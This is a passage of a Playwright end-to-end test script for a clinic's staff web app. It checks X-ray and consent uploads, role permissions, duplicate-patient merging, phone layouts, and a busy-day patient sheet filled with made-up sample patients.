  const tiles = pu.locator('.photos-panel figure.xray-tile');
  const before = await tiles.count();
  // Every file waits until the step lets it go; the second one is saved but its answer is lost once ("Failed to fetch").
  await pu.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const real = state.data.uploadXray;
    window.__realUploadXray = real;
    let calls = 0;
    let lost = false;
    state.data.uploadXray = async function (args) {
      calls += 1;
      await new Promise((resolve) => { window.__releaseXray = resolve; window.__xrayWaiting = calls; });
      const row = await real.call(this, args);
      if (calls === 2 && !lost) { lost = true; throw new TypeError('Failed to fetch'); }
      return row;
    };
  });
  const release = async (n) => { await pu.waitForFunction((k) => window.__xrayWaiting === k, n); await pu.evaluate(() => window.__releaseXray()); };
  try {
    await pu.locator('.profile-uploads').getByRole('button', { name: 'Upload X-ray' }).click();
    const m = pu.locator('.modal');
    await m.locator('input[type=file]').setInputFiles([onePixel('pa-1.png'), onePixel('pa-2.png'), onePixel('pa-3.png')]);
    await m.getByRole('button', { name: 'Upload' }).click();
    await m.locator('.upload-progress', { hasText: 'Uploading X-ray 1 of 3…' }).waitFor();
    await pu.keyboard.press('Escape');
    await pu.locator('.toast', { hasText: 'Saving, wait a moment.' }).waitFor();
    assert.equal(await m.count(), 1, 'Escape does not hide an upload that is still going');
    await release(1);
    await m.locator('.upload-progress', { hasText: 'Uploading X-ray 2 of 3…' }).waitFor();
    await release(2);
    await pu.locator('.toast', { hasText: 'No internet connection, so this did not go through. Try again once the connection is back. 1 of 3 X-rays were uploaded; pressing Upload again sends only the rest.' }).waitFor();
    assert.equal(await m.locator('.upload-progress').innerText(), '', 'no progress line once it stopped');
    await m.getByRole('button', { name: 'Upload' }).click();
    await release(3);
    await release(4);
    await pu.locator('.toast', { hasText: '3 X-rays uploaded.' }).waitFor();
    await m.waitFor({ state: 'detached' });
    await pu.waitForFunction((n) => document.querySelectorAll('.photos-panel figure.xray-tile').length >= n, before + 3);
    assert.equal(await tiles.count(), before + 3, 'three X-rays, none twice (the one whose answer was lost is not saved again)');
  } finally {
    await pu.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.uploadXray = window.__realUploadXray; });
  }
});
await step('assistant (who may not edit the patient): Upload consent form takes photos of the pages and ticks "Consent signed"', async () => {
  await pu.waitForSelector('.badge:has-text("No treatment consent on file")');
  await pu.locator('.profile-uploads').getByRole('button', { name: 'Upload consent form' }).click();
  const m = pu.locator('.modal');
  await m.locator(`h2:has-text("Upload consent form · ${puPatient.name}")`).waitFor();
  assert.equal(await m.getByLabel('Type').count(), 0, 'the type is fixed: a consent form');
  assert.equal(await m.locator('input[type=file]').getAttribute('accept'), 'application/pdf,image/*');
  await m.locator('input[type=file]').setInputFiles([onePixel('consent-page-1.png'), onePixel('consent-page-2.png')]);
  await m.getByRole('button', { name: 'Save' }).click();
  await pu.locator('.toast', { hasText: '2 files saved. "Consent signed" is now ticked.' }).waitFor();
  await pu.waitForSelector('.profile-flags .badge-ok:has-text("Consent signed")');
  const rows = pu.locator('.documents-list tbody tr');
  assert.deepEqual(await rows.locator('td:nth-child(3)').allInnerTexts(), ['Consent and information form (1 of 2)', 'Consent and information form (2 of 2)']);
  assert.deepEqual(await rows.locator('td:nth-child(2)').allInnerTexts(), ['Consent form', 'Consent form']);
});
await step('accountant: no upload buttons, no Add document or Delete, and no X-rays on the profile', async () => {
  await tryAnotherRole(pu);
  await loginAs(pu, 'Accountant');
  await pu.goto(puPatient.url);
  await pu.waitForSelector('h2:has-text("Photos and X-rays")');
  await pu.locator('.documents-list').waitFor();
  assert.equal(await pu.locator('.profile-uploads').count(), 0);
  assert.equal(await pu.getByRole('button', { name: /^(Upload|Add document|Delete)/ }).count(), 0);
  assert.equal(await pu.locator('figure.xray-tile').count(), 0, 'X-rays need xrays.view');
});
await step('Delete removes a document after confirming; the last consent form asks whether to untick "Consent signed"', async () => {
  await tryAnotherRole(pu);
  await loginAs(pu, 'Assistant');
  await pu.goto(puPatient.url);
  await pu.locator('.documents-list').waitFor();
  const del = (title) => pu.locator('.documents-list').getByRole('button', { name: `Delete ${title}` });
  const m = pu.locator('.modal');
  await del('Consent and information form (1 of 2)').click();
  await m.locator('h2:has-text("Delete this document?")').waitFor();
  assert.equal(await m.locator('p').first().innerText(), `Delete Consent and information form (1 of 2) from ${puPatient.name}'s record? This cannot be undone.`);
  assert.equal(await m.locator('input[type=checkbox]').count(), 0, 'another consent form is left: nothing to untick');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
  assert.equal(await pu.locator('.documents-list tbody tr').count(), 2, 'Cancel deletes nothing');
  await del('Consent and information form (1 of 2)').click();
  await m.getByRole('button', { name: 'Delete', exact: true }).click();
  await pu.waitForSelector('.toast:has-text("Document deleted.")');
  await m.waitFor({ state: 'detached' });
  await pu.waitForFunction(() => document.querySelectorAll('.documents-list tbody tr').length === 1);
  await pu.waitForSelector('.profile-flags .badge-ok:has-text("Consent signed")');
  await del('Consent and information form (2 of 2)').click();
  await m.getByLabel(/last consent form on the record/).check();
  await m.getByRole('button', { name: 'Delete', exact: true }).click();
  await pu.locator('.toast', { hasText: 'Document deleted. "Consent signed" is unticked.' }).waitFor();
  await pu.waitForSelector('text=No documents yet.');
  await pu.waitForSelector('.profile-flags .badge:has-text("No treatment consent on file")');
});
await step('on a phone (375 px): the three buttons are in sight, the page does not scroll sideways, and Delete in the Documents list is fully on screen', async () => {
  const ph = await newPage({ width: 375, height: 812 }, { isMobile: true, hasTouch: true });
  try {
    await loginAs(ph, 'Assistant');
    await ph.goto(BASE + '#/staff/patients');
    await ph.waitForSelector('table.list tbody tr');
    await ph.click('table.list tbody tr:first-child a');
    await ph.waitForSelector('h2:has-text("Photos and X-rays")');
    assert.equal(await ph.locator('.profile-uploads button').count(), 3);
    for (const b of await ph.locator('.profile-uploads button').all()) {
      const box = await b.boundingBox();
      assert.ok(box && box.x >= 0 && box.x + box.width <= 375, `${await b.innerText()} is in sight: ${box && Math.round(box.x)}-${box && Math.round(box.x + box.width)} px`);
    }
    await ph.locator('.profile-uploads').getByRole('button', { name: 'Upload consent form' }).click();
    const m = ph.locator('.modal');
    await m.locator('input[type=file]').setInputFiles([onePixel('consent-page-1.png'), onePixel('consent-page-2.png')]);
    await m.getByRole('button', { name: 'Save' }).click();
    await m.waitFor({ state: 'detached' });
    await ph.locator('.documents-list tbody tr').nth(1).waitFor();
    const scroller = await ph.locator('.table-scroll:has(.documents-list)').boundingBox();
    const dels = await ph.locator('.documents-list').getByRole('button', { name: /^Delete / }).all();
    assert.equal(dels.length, 2);
    for (const del of dels) {
      const box = await del.boundingBox();
      assert.ok(box.x >= scroller.x - 1 && box.x + box.width <= scroller.x + scroller.width + 1,
        `Delete inside the list's box: ${Math.round(box.x)}-${Math.round(box.x + box.width)} px in ${Math.round(scroller.x)}-${Math.round(scroller.x + scroller.width)} px`);
    }
    assert.ok(await ph.locator('.table-scroll:has(.documents-list)').evaluate((el) => el.scrollWidth <= el.clientWidth + 1), 'the list needs no sideways scroll');
    assert.ok(await ph.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the page itself does not scroll sideways');
    await shot(ph, '31b-patient-uploads-phone');
  } finally { await ph.close(); }
});
await pu.close();

await step('duplicate patients: a second record with the same phone is found and merged', async () => {
  // Patient 2 in the demo has phone 03010734521 (i = 1). Register a second record with that number.
  await p7.goto(BASE + '#/staff/patients');
  await p7.getByRole('button', { name: 'New patient' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Full name').fill('Duplicate Test Person');
  await m.getByLabel('Phone number').fill('03010734521');
  await m.getByLabel('Phone number').press('Tab');
  await p7.waitForSelector('.modal .alert-warning:has-text("Possible existing patient")');
  await m.getByRole('button', { name: 'Create patient' }).click();
  await p7.waitForSelector('.toast:has-text("registered as Mr#")');
  await p7.goto(BASE + '#/staff/admin?tab=duplicates');
  await p7.waitForSelector('h2:has-text("03010734521")');
  const group = p7.locator('section.panel', { hasText: '03010734521' });
  assert.ok(await group.locator('td:has-text("Duplicate Test Person")').count());
  await group.getByRole('button', { name: 'Merge into the ticked one' }).click();
  await p7.locator('.modal').getByLabel('I have compared these records').check();
  await p7.locator('.modal').getByRole('button', { name: /^Merge 1 into Mr#/ }).click();
  await p7.waitForSelector('.toast:has-text("Merged:")');
  assert.equal(await p7.locator('h2:has-text("03010734521")').count(), 0);
  await shot(p7, '17-duplicates');
});

await step('"View as patient" shows the record the way the patient sees it', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('link', { name: 'View as patient' }).click();
  await p7.waitForSelector('.alert:has-text("Patient view")');
  assert.ok(await p7.locator('h1:has-text("Hello,")').count());
  assert.ok(await p7.locator('h2:has-text("Invoices and payments")').count());
  assert.ok(await p7.locator('button:has-text("Report / complain")[disabled]').count(), 'complaint button is switched off in the preview');
  await shot(p7, '18-view-as-patient');
  await p7.getByRole('link', { name: 'Back to the record' }).click();
  await p7.waitForSelector('h2:has-text("Money")');
});

await step('sheet filters (doctor, dues, find) and quick-tap treatment details', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=1');
  await p7.waitForSelector('table.sheet tbody tr');
  const total = await p7.locator('table.sheet tbody tr').count();
  await p7.getByRole('button', { name: /^Filters/ }).click();
  await p7.locator('label:has-text("With dues") input').check();
  const withDues = await p7.locator('table.sheet tbody tr').count();
  assert.ok(withDues <= total);
  await p7.locator('label:has-text("With dues") input').uncheck();
  await p7.locator('input[aria-label="Find on this list"]').fill('zzzz-no-such-name');
  assert.ok(await p7.locator('table.sheet tbody td:has-text("No patients")').count());
  await p7.locator('input[aria-label="Find on this list"]').fill('');
  await p7.waitForSelector('table.sheet tbody tr .quick-tap');
  await p7.locator('table.sheet tbody tr .quick-tap').first().click();
  await p7.locator('.modal button:has-text("018")').click();
  await p7.locator('.modal button:has-text("PC")').first().click();
  await p7.locator('.modal').getByRole('button', { name: 'Done' }).click();
  const v = await p7.locator('table.sheet tbody tr').first().locator('input[aria-label^="Treatment details"]').inputValue();
  assert.match(v, /018 PC$/);
});

await step('payment receipt opens from the patient record; WhatsApp link next to the phone', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  assert.ok(await p7.locator('.phone-link a[href^="https://wa.me/92"]').count(), 'WhatsApp link');
  await p7.locator('details summary:has-text("payments")').click();
  await p7.locator('button:has-text("Receipt")').first().click();
  await p7.waitForSelector('.modal .invoice-sheet:has-text("Payment receipt")');
  assert.match(await p7.locator('.modal .invoice-sheet').innerText(), /Received/);
  await p7.locator('.modal .modal-actions').getByRole('button', { name: 'Close' }).click();
});

await step('complaint linked to a doctor shows on that doctor\'s own dashboard with their share', async () => {
  await p7.goto(BASE + '#/staff/complaints');
  await p7.waitForSelector('table.list tbody tr');
  await p7.locator('table.list tbody tr').first().locator('button.link-btn').click();
  await p7.waitForSelector('.modal select[aria-label="About which doctor"]');
  await p7.locator('.modal select[aria-label="About which doctor"]').selectOption({ label: 'Dr. Hina (sample)' });
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.keyboard.press('Escape');
  const pd = await newPage();
  await loginAs(pd, 'Dr. Bushra');
  await pd.goto(BASE + '#/staff/log');
  await pd.waitForSelector('.stat:has-text("Own patients (brought in)")');
  const text = await pd.locator('main').innerText();
  assert.match(text, /Own patients \(brought in\)/);
  assert.match(text, /Your share \(30% of own patients paid\)/);
  assert.match(text, /Complaints about your work/);
  await shot(pd, '13-doctor-dashboard');
  await pd.close();
});

const p6 = await newPage({ width: 390, height: 844 });
await step('sheet works on a phone', async () => {
  await loginAs(p6, 'Front desk \\(Gulshan\\)').catch(async () => {
    await p6.goto(BASE + '#/login/staff');
    await p6.getByRole('button', { name: /Front desk \(Gulshan\)/ }).click();
  });
  await p6.goto(BASE + '#/staff/sheet');
  await p6.waitForSelector('table.sheet tbody tr');
  await shot(p6, '10-sheet-mobile');
});
await step('phone width (390px): the Aaj ki List controls do not overlap, the page does not scroll sideways, and the name stays at the left edge', async () => {
  const check = await p6.evaluate(() => {
    const els = [...document.querySelectorAll('.sheet-head :is(h1, button, a, input, select), .sheet-subhead :is(button, .save-status), .add-panel :is(.add-label, button, input, .add-panel-text)')]
      .filter((el) => el.getClientRects().length && !el.closest('[hidden]'));
    const r = els.map((el) => el.getBoundingClientRect());
    const name = (el) => (el.getAttribute('aria-label') || el.textContent).trim().slice(0, 30);
    const overlaps = [];
    for (let i = 0; i < r.length; i++) {
      for (let j = i + 1; j < r.length; j++) {
        if (els[i].contains(els[j]) || els[j].contains(els[i])) continue;
        const [a, b] = [r[i], r[j]];
        if (a.left < b.right - 1 && b.left < a.right - 1 && a.top < b.bottom - 1 && b.top < a.bottom - 1) overlaps.push(`${name(els[i])} / ${name(els[j])}`);
      }
    }
    const offscreen = els.filter((el, i) => r[i].right > window.innerWidth + 1 || r[i].left < -1).map(name);
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollLeft = 400;
    const w = wrap.getBoundingClientRect();
    const cell = document.querySelector('table.sheet tbody th.name-col').getBoundingClientRect();
    return { n: els.length, overlaps, offscreen, sideScroll: document.documentElement.scrollWidth > window.innerWidth + 1, scrolled: wrap.scrollLeft, nameLeft: cell.left - w.left };
  });
  assert.ok(check.n >= 8, 'found the controls: ' + check.n);
  assert.deepEqual(check.overlaps, [], 'no two controls overlap');
  assert.deepEqual(check.offscreen, [], 'every control is on the screen');
  assert.ok(!check.sideScroll, 'the page itself does not scroll sideways');
  assert.ok(check.scrolled > 300 && Math.abs(check.nameLeft - 1) <= 2, 'the name column stays at the left edge: ' + JSON.stringify(check));
  await p6.evaluate(() => { document.querySelector('.sheet-wrap').scrollLeft = 0; });
});

// ------------------------------------------------------------- the Aaj ki List like the clinic's Google Sheet, on a busy day
// "?demo=busy" fills today's Gulshan list with 120 made-up patients ("Sample Patient 001" to "120", Mr# 7001 to 7120).
const pb = await newPage({ width: 1366, height: 768 });
const measureSheet = (pg) => pg.evaluate(() => {
  const wrap = document.querySelector('.sheet-wrap');
  const head = wrap.querySelector('thead').getBoundingClientRect();
  const w = wrap.getBoundingClientRect();
  const bottom = Math.min(w.top + wrap.clientTop + wrap.clientHeight, window.innerHeight);
  const inSight = [...wrap.querySelectorAll('tbody tr')].filter((tr) => { const r = tr.getBoundingClientRect(); return r.top >= head.bottom - 0.5 && r.bottom <= bottom + 0.5; }).length;
  const page = document.querySelector('.sheet-page').getBoundingClientRect();
  const add = document.querySelector('.add-panel').getBoundingClientRect();
  return { inSight, chrome: Math.round(w.top - page.top + add.height), pageScrolls: document.documentElement.scrollHeight > window.innerHeight + 1, addBottom: add.bottom };
});
// The note of a busy-day patient as the data has it (it saves by itself, after a short pause): the list shows no note mark.
async function expectNote(pg, name, text) {
  const noteOf = () => pg.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)?.notes ?? null;
  }, name);
  for (let i = 0; i < 50 && (await noteOf()) !== text; i += 1) await pg.waitForTimeout(100);
  assert.equal(await noteOf(), text, `${name}: the note is saved`);
}
await step('busy day at 1366x768: at least 20 patients in sight without scrolling the page, the header row stays put while the rows scroll, head and add line under 150px', async () => {
  await loginAs(pb, 'Front desk \\(Gulshan\\)');
  await pb.goto(BASE + '#/staff/sheet?demo=busy');
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
  const m = await measureSheet(pb);
  assert.ok(m.inSight >= 20, 'patient rows fully in sight: ' + JSON.stringify(m));
  assert.ok(!m.pageScrolls, 'the page itself does not scroll: ' + JSON.stringify(m));
  assert.ok(m.chrome <= 150, 'page head, toolbar and add line: ' + JSON.stringify(m));
  assert.ok(m.addBottom <= 768, 'the add line is in sight at the bottom: ' + JSON.stringify(m));
  const scrolled = await pb.evaluate(() => {
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollTop = 900;
    const w = wrap.getBoundingClientRect();
    const th = wrap.querySelector('thead th.mr-cell').getBoundingClientRect();
    const first = [...wrap.querySelectorAll('tbody tr')].find((tr) => tr.getBoundingClientRect().top >= th.bottom - 1);
    return { top: wrap.scrollTop, headTop: th.top - w.top, firstRow: Number(first?.dataset.n) };
  });
  assert.ok(scrolled.top > 800 && Math.abs(scrolled.headTop - 1) <= 2 && scrolled.firstRow > 30, 'the header row stays at the top: ' + JSON.stringify(scrolled));
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 0; });
  await shot(pb, '20-sheet-busy-1366');
});
await step('busy day at 1920x1080: at least 28 patients in sight; at 1100px wide the Mr# and name columns stay put when the list scrolls sideways', async () => {
  await pb.setViewportSize({ width: 1920, height: 1080 });
  await pb.waitForTimeout(200);
  const m = await measureSheet(pb);
  assert.ok(m.inSight >= 28 && !m.pageScrolls, 'patient rows fully in sight: ' + JSON.stringify(m));
  await shot(pb, '21-sheet-busy-1920');
  await pb.setViewportSize({ width: 1100, height: 768 });
  await pb.waitForTimeout(200);
  const frozen = await pb.evaluate(() => {
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollLeft = 300;
    const w = wrap.getBoundingClientRect().left;
    const at = (sel) => Math.round(document.querySelector(sel).getBoundingClientRect().left - w);
    return { scrolled: wrap.scrollLeft, num: at('table.sheet tbody td.rownum'), mr: at('table.sheet tbody td.mr-cell'), name: at('table.sheet tbody th.name-col'), headName: at('table.sheet thead th.name-col') };
  });
  assert.ok(frozen.scrolled > 100, 'the list scrolled sideways: ' + JSON.stringify(frozen));
  assert.ok(Math.abs(frozen.num - 1) <= 2 && Math.abs(frozen.mr - 35) <= 2 && Math.abs(frozen.name - 97) <= 2 && frozen.headName === frozen.name, 'row number, Mr# and name stay at the left: ' + JSON.stringify(frozen));
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollLeft = 0; });
  await pb.setViewportSize({ width: 1366, height: 768 });
});
await step('the columns are the sheet\'s, in the sheet\'s order (the serial number first, Reminder Status last, Group a drop-down), with the purple header row and the red P.P heading', async () => {
  // Owner, 11 Oct 2026: "the columns of google sheet should be same here too, for example, the group column with drop
  // down". The sheet: MR #, Patient Name, Months, Treatment, Token, Waiting (the status), Group, Doctor Name, Treatment
  // Details, P.P, Healthwire (Invoice: billing is on the website now), Contact No, Reminder Status.
  const heads = (await pb.locator('table.sheet thead th:visible').allInnerTexts()).map((t) => t.replace('▾', '').trim());
  assert.deepEqual(heads, ['#', 'MR #', 'Patient Name', 'Month', 'Treatment', 'Token', 'Status', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Invoice', 'Contact No', 'Reminder Status']);
  const cells = await pb.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => ({ rows: trs.length, odd: trs.filter((tr) => tr.children.length !== document.querySelectorAll('table.sheet col').length).length,
    groups: trs.filter((tr) => !tr.classList.contains('is-checkup')).map((tr) => tr.children[7].querySelector('select[aria-label^="Doctor group for"]')?.options.length || 0) }));
  assert.ok(cells.rows >= 120 && cells.odd === 0, 'one cell per heading in every row: ' + JSON.stringify({ rows: cells.rows, odd: cells.odd }));
  assert.ok(cells.groups.every((n) => n >= 4), 'the Group cell of every patient row is a drop-down (No group, Group 1 to 3 at least)');
  // On a 1366px laptop Treatment Details keeps about the width of the sheet's column and the list scrolls sideways for the
  // last columns (Contact No, Reminder Status), as the sheet's last columns are out of sight in a laptop's window.
  const room = await pb.evaluate(() => {
    const th = (t) => [...document.querySelectorAll('table.sheet thead th')].find((x) => x.textContent.replace('▾', '').trim() === t);
    const wrap = document.querySelector('.sheet-wrap');
    return { details: Math.round(th('Treatment Details').getBoundingClientRect().width), reminderCut: th('Reminder Status').scrollWidth > th('Reminder Status').clientWidth,
      sideScroll: wrap.scrollWidth > wrap.clientWidth };
  });
  assert.ok(room.details >= 250 && !room.reminderCut && room.sideScroll, 'Treatment Details keeps its room: ' + JSON.stringify(room));
  const c = await pb.evaluate(() => {
    const s = (sel) => getComputedStyle(document.querySelector(sel));
    return { head: s('table.sheet thead th.mr-cell').backgroundColor, headText: s('table.sheet thead th.mr-cell').color, pp: s('table.sheet thead th.pp-head').backgroundColor,
      ppText: s('table.sheet thead th.pp-head').color, dues: s('table.sheet tbody .pp-due').color, duesWeight: s('table.sheet tbody .pp-due').fontWeight };
  });
  assert.equal(c.head, 'rgb(90, 50, 134)', 'purple header row');
  assert.equal(c.headText, 'rgb(255, 255, 255)');
  const [r, g, b] = c.pp.match(/\d+/g).map(Number);
  assert.ok(r >= 200 && g <= 30 && b <= 30 && c.ppText === 'rgb(255, 255, 255)', 'red P.P heading with white text: ' + JSON.stringify(c));
  assert.ok(/^rgb\(2\d\d, 0, 0\)$/.test(c.dues) && Number(c.duesWeight) >= 700, 'dues in red bold: ' + JSON.stringify(c));
  const pp = await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 007' }).locator('td.pp').innerText();
  assert.match(pp, /^11\.5k/, 'P.P written like the sheet');
  assert.deepEqual(await pb.evaluate(async () => { const m = await import('/js/views/staff/sheet.js'); return [0, 500, 11500, 20000, 125000].map(m.shortRupees); }), ['0', '500', '11.5k', '20k', '125k']);
});
await step('status, group, month and doctor chips carry the sheet\'s colours; Invoice shows Done or Pending', async () => {
  const chips = await pb.evaluate(() => {
    const rows = [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')];
    return {
      status: rows.map((tr) => { const s = tr.querySelector('select[aria-label^="Status for"]'); return [s.value, s.className, getComputedStyle(s).backgroundColor]; }),
      group: rows.map((tr) => { const s = tr.querySelector('select[aria-label^="Doctor group for"]'); return [s.value, s.className]; }),
      month: rows.map((tr) => tr.querySelector('.month-pill')).filter(Boolean).map((el) => [el.textContent, el.className]),
      people: [...document.querySelectorAll('table.sheet tbody .people .person')].map((el) => [el.getAttribute('title').replace(/ \((checked|assistant)\)$/, ''), (el.className.match(/\bgs-\w+/) || [''])[0]]),
    };
  });
  const statusTone = { completed: 'gs-yellow', in_treatment: 'gs-green', scheduled: 'gs-blue', waiting: 'gs-orange', cancelled: 'gs-grey', no_show: 'gs-red' };
  assert.ok(new Set(chips.status.map(([v]) => v)).size >= 4, 'the busy day has every state of a day half done');
  for (const [v, cls] of chips.status) assert.ok(cls.split(' ').includes(statusTone[v]), `status ${v}: ${cls}`);
  assert.ok(chips.status.some(([v, , bg]) => v === 'completed' && bg === 'rgb(255, 229, 160)'), 'Completed is the sheet\'s light yellow');
  assert.ok(chips.status.some(([v, , bg]) => v === 'waiting' && bg === 'rgb(255, 200, 170)'), 'Waiting is light orange');
  const groupTone = { '': 'gs-grey', 1: 'gs-blue', 2: 'gs-green', 3: 'gs-purple' };
  assert.ok(new Set(chips.group.map(([v]) => v)).size >= 4, 'groups 1 to 3 and no group');
  for (const [v, cls] of chips.group) assert.ok(cls.split(' ').includes(groupTone[v]), `group ${v}: ${cls}`);
  assert.ok(chips.month.some(([t]) => /Photo/.test(t)) && chips.month.some(([t]) => !/Photo/.test(t)), 'photo months and other months');
  for (const [text, cls] of chips.month) assert.ok(cls.split(' ').includes(/Photo/.test(text) ? 'gs-green' : 'gs-purple'), `month ${text}: ${cls}`);
  assert.ok(chips.people.length >= 60, 'doctor chips: ' + chips.people.length);
  const tone = new Map();
  for (const [name, cls] of chips.people) {
    assert.ok(cls, `${name} has a colour`);
    if (tone.has(name)) assert.equal(cls, tone.get(name), `${name} keeps one colour on every row`);
    tone.set(name, cls);
  }
  // Two people in one cell never share a colour on the busy day (the sample clinicians have fixed ids, so their colours are
  // also the same on every load).
  const clash = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody .people')].flatMap((cell) => {
    const ps = [...cell.querySelectorAll('.person')].map((el) => [el.getAttribute('title').replace(/ \((checked|assistant)\)$/, ''), (el.className.match(/\bgs-\w+/) || [''])[0]]);
    return ps.flatMap(([n, c], i) => ps.slice(i + 1).filter(([m, d]) => m !== n && d === c).map(([m]) => `${n} / ${m}`));
  }));
  assert.deepEqual(clash, [], 'people in one cell with the same colour');
  // Every sample clinician has a colour of their own (eleven people, fourteen colours; lib/tones.js), and someone who is not
  // on the clinic's list (no longer active) still gets one colour every time.
  const own = await pb.evaluate(async () => {
    const m = await import('/js/views/staff/sheet.js');
    const { state } = await import('/js/state.js');
    return { all: state.ref.clinicians.map((c) => m.doctorTone(c.id, c.display_name)), gone: ['a1', 'b2'].map((id) => [m.doctorTone(id, 'Dr. Made Up'), m.doctorTone(id, 'Dr. Made Up')]) };
  });
  assert.ok(own.all.length === 11 && new Set(own.all).size === 11, 'every sample clinician differs: ' + JSON.stringify(own.all));
  assert.ok(own.gone.every(([a, b]) => a && a === b && a !== 'grey'), JSON.stringify(own.gone));
  assert.ok(await pb.locator('table.sheet tbody td span.chip.gs-green:text-is("Done")').count(), 'Done');
  assert.ok(await pb.locator('table.sheet tbody td button.invoice-pending.gs-darkred:text-is("Pending")').count(), 'Pending (treated, no invoice yet)');
  const unbilled = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
    .map((tr) => [tr.querySelector('select[aria-label^="Status for"]').value, tr.querySelector('.invoice-pending, .invoice-none')]).filter(([, b]) => b)
    .map(([status, b]) => ({ status, pending: b.classList.contains('invoice-pending'), grey: b.classList.contains('gs-grey'), label: b.getAttribute('aria-label'),
      shown: [...b.childNodes].filter((n) => !(n.nodeType === 1 && n.classList.contains('sr-only'))).map((n) => n.textContent).join('').trim() })));
  const notSeen = unbilled.filter((x) => ['waiting', 'scheduled'].includes(x.status));
  assert.ok(notSeen.length > 10 && notSeen.every((x) => !x.pending && x.grey && x.shown === '' && /^No invoice yet for .+: make a new invoice$/.test(x.label)),
    'not seen yet: an empty grey chip, "No invoice yet" for screen readers: ' + JSON.stringify(notSeen.find((x) => x.pending || x.shown)));
  const seen = unbilled.filter((x) => ['in_treatment', 'completed'].includes(x.status));
  assert.ok(seen.length && seen.every((x) => x.pending && x.shown === 'Pending' && /^Invoice pending for /.test(x.label)), 'seen and no invoice: Pending');
  await shot(pb, '22-sheet-chips');
});
await step('round 3: sorted like the sheet (Waiting, In treatment, Scheduled, then Completed, then Cancelled and No show) with one running serial number 1..n at the far left; the Completed count says how many are done', async () => {
  // Owner, 11 Oct 2026: "waiting patient comes at the top, then treatment, then scheduled, then completed ones at the last"
  // and "i want a serial number by the left side, so we can see how many patients we have actually done".
  const rows = await pb.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => trs.map((t) => ({
    status: t.querySelector('select[aria-label^="Status for"]').value, serial: t.querySelector('td.rownum').textContent, first: t.children[0].matches('td.rownum') })));
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  assert.ok(rows.length >= 120, 'the busy list: ' + rows.length);
  assert.ok(rows.every((r, i) => i === 0 || rank[rows[i - 1].status] <= rank[r.status]), 'sorted by status: ' + [...new Set(rows.map((r) => r.status))].join(', '));
  const done = rows.map((r) => r.status === 'completed');
  const toSee = rows.map((r) => ['waiting', 'in_treatment', 'scheduled', ''].includes(r.status)).lastIndexOf(true);
  assert.ok(done.indexOf(true) > toSee && done.lastIndexOf(true) - done.indexOf(true) + 1 === done.filter(Boolean).length,
    'the Completed rows come together, after every patient still to be seen');
  assert.deepEqual(rows.map((r) => r.serial), rows.map((_, i) => String(i + 1)), 'one running serial number 1..n down the list (not the token)');
  assert.ok(rows.every((r) => r.first), 'the serial number is the far left column');
  const completed = await pb.locator('.sheet-counts button', { hasText: 'Completed' }).innerText();
  assert.equal(Number(completed.replace(/\D/g, '')), done.filter(Boolean).length, 'the Completed count: ' + completed);
});
await step('round 3: two doctors in one cell have clearly different colours, and so do the doctors down the list', async () => {
  // Owner, 11 Oct 2026: "doctor names should have similar colours so they dont look all the same", like the sheet.
  const r93 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 093' });
  assert.equal(await r93.locator('.person').count(), 0);
  await r93.locator('.add-person').click();
  for (const name of ['Dr. Amna (sample)', 'Dr. Bushra (sample)']) {
    await pb.click(`.modal button:has-text("${name}")`);
    await pb.waitForSelector(`.toast:has-text("${name} added to Sample Patient 093")`);
  }
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  await r93.locator('.person').nth(1).waitFor();
  const two = await r93.locator('.person').evaluateAll((els) => els.map((el) => ({ tone: (el.className.match(/\bgs-\w+/) || [''])[0], bg: getComputedStyle(el).backgroundColor })));
  assert.ok(two.length === 2 && two[0].tone && two[0].tone !== two[1].tone && two[0].bg !== two[1].bg, 'two doctors in one cell: ' + JSON.stringify(two));
  // down the list: one colour per person, and different people never share one on the busy day
  const byName = await pb.evaluate(() => {
    const m = {};
    for (const el of document.querySelectorAll('table.sheet tbody .people .person')) m[el.getAttribute('title').replace(/ \((checked|assistant)\)$/, '')] = (el.className.match(/\bgs-\w+/) || [''])[0];
    return m;
  });
  const tones = Object.values(byName);
  assert.ok(tones.length >= 8 && tones.every(Boolean) && new Set(tones).size === tones.length, 'one colour per person down the list: ' + JSON.stringify(byName));
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: an exact Mr# and Enter adds that patient at once (no extra click) and puts the cursor in the Treatment cell; Enter there saves and goes to the add box for the next Mr# (never into the row below)', async () => {
  const before = await pb.locator('table.sheet tbody tr').count();
  const box = pb.locator('.add-panel input[type=search]');
  // (the checkup rows as the data has them: their cells save as they are typed, so the next Mr# must not land in one)
